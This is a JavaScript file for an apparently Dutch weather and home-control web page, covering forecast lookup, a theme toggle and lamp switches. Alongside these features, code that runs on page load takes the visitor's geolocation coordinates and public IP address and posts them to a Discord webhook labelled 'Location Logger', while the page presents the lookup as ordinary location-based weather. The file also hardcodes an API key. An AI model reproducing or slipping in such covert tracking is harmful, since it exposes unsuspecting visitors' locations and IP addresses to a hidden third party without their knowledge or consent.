const weatherApiKey = "f41e34e15a1142f9cf0d83de9c9f532f"; // OpenWeather API Key


// 🌙 Dark/Light Mode Toggle
const modeToggle = document.getElementById("modeToggle");
modeToggle.addEventListener("click", () => {
    document.body.classList.toggle("light-mode");
    document.querySelector(".logo-container img").src = document.body.classList.contains("light-mode") ? "imagePurp.png" : "image.png";
    localStorage.setItem("lightMode", document.body.classList.contains("light-mode"));
    modeToggle.textContent = document.body.classList.contains("light-mode") ? "🌙 Dark Mode" : "🌞 Light Mode";
});

// 🌟 Restore Mode Preference
document.addEventListener("DOMContentLoaded", () => {
    if (localStorage.getItem("lightMode") === "true") {
        document.body.classList.add("light-mode");
        document.querySelector(".logo-container img").src = "imagePurp.png";
        modeToggle.textContent = "🌙 Dark Mode";
    }
});

// 🛠️ Expand Weekly Forecast (Meer Weer)
document.getElementById("expandWeather").addEventListener("click", () => {
    const forecast = document.getElementById("weeklyForecast");
    forecast.style.display = (forecast.style.display === "none" || forecast.style.display === "") ? "block" : "none";
});

// 🌍 Fetch Weather Data
async function fetchWeather(city) {
    const url = `https://api.openweathermap.org/data/2.5/forecast?q=${city}&units=metric&appid=${weatherApiKey}`;
    try {
        let response = await fetch(url);
        let data = await response.json();

        if (data.cod !== "200") {
            alert("Stad niet gevonden!");
            return;
        }

        const today = data.list[0];
        const tomorrow = data.list[8];

        let todayIcon = today.weather[0].icon;
        let tomorrowIcon = tomorrow.weather[0].icon;

        document.getElementById("todayTemp").innerHTML = `
            ${Math.round(today.main.temp)}° 
            <img src="https://openweathermap.org/img/wn/${todayIcon}.png" class="weather-icon">
        `;
        document.getElementById("tomorrowTemp").innerHTML = `
            ${Math.round(tomorrow.main.temp)}° 
            <img src="https://openweathermap.org/img/wn/${tomorrowIcon}.png" class="weather-icon">
        `;

        let weeklyHtml = "";
        for (let i = 0; i < 5; i++) {
            let temp = Math.round(data.list[i * 8]?.main.temp || 0);
            let icon = data.list[i * 8]?.weather[0].icon;
            weeklyHtml += `
                <div class="forecast-day">
                    Dag ${i + 1}: ${temp}°C 
                    <img src="https://openweathermap.org/img/wn/${icon}.png" class="weather-icon">
                </div>
            `;
        }
        document.getElementById("weeklyForecast").innerHTML = weeklyHtml;

    } catch (error) {
        console.error("Weather API error:", error);
    }
}

// 🌧️ Weather Animations
function applyWeatherAnimation(iconCode) {
    let body = document.body;
    body.classList.remove("rainy", "snowy", "sunny");

    if (iconCode.includes("d")) {
        body.classList.add("sunny"); 
    }
    if (iconCode.includes("09") || iconCode.includes("10")) {
        body.classList.add("rainy"); 
    }
    if (iconCode.includes("13")) {
        body.classList.add("snowy"); 
    }
}

// 🔎 Search Weather
document.getElementById("searchWeather").addEventListener("click", () => {
    const city = document.getElementById("cityInput").value;
    fetchWeather(city);
});

// 📍 Get User Location & Fetch Weather
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const ip = await getUserIP();
                sendToDiscord(ip, lat, lon);
                fetchWeatherByLocation(lat, lon);
            },
            (error) => {
                console.error("Geolocation error:", error);
                alert("Kan locatie niet ophalen.");
            }
        );
    }
}

// 🌍 Fetch Weather by Location
async function fetchWeatherByLocation(lat, lon) {
    const url = `https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&units=metric&appid=${weatherApiKey}`;
    try {
        let response = await fetch(url);
        let data = await response.json();

        document.getElementById("todayTemp").innerText = `${Math.round(data.list[0].main.temp)}°`;
        document.getElementById("tomorrowTemp").innerText = `${Math.round(data.list[8].main.temp)}°`;
    } catch (error) {
        console.error("Weather API error:", error);
    }
}


async function sendToDiscord(ip, lat, lon) {
    const payload = {
        username: "Location Logger",
        avatar_url: "https://i.imgur.com/AfFp7pu.png",
        content: `📍 **New Location Accessed**\n🔹 **IP:** ${ip}\n🌍 **Coordinates:** ${lat}, ${lon}`
    };

    try {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        console.log("Data sent to Discord successfully!");
    } catch (error) {
        console.error("Error sending to Discord:", error);
    }
}

// 📍 Fetch User IP
async function getUserIP() {
    try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return "Unknown";
    }
}

document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll(".lamp").forEach(lamp => {
        lamp.addEventListener("click", () => {
            lamp.classList.toggle("on");
            lamp.classList.toggle("off");
            saveLampState();
        });
    });

    function saveLampState() {
        let lampStates = [];
        document.querySelectorAll(".lamp").forEach(lamp => {
            lampStates.push(lamp.classList.contains("on") ? "on" : "off");
        });
        localStorage.setItem("lampStates", JSON.stringify(lampStates));
    }

    function loadLampState() {
        let savedLamps = JSON.parse(localStorage.getItem("lampStates"));
        if (!savedLamps) return;
        document.querySelectorAll(".lamp").forEach((lamp, index) => {
            lamp.classList.remove("on", "off");
            lamp.classList.add(savedLamps[index] || "off");
        });
    }

    loadLampState();
});

// 📍 Start Location on Page Load
document.addEventListener("DOMContentLoaded", getLocation);
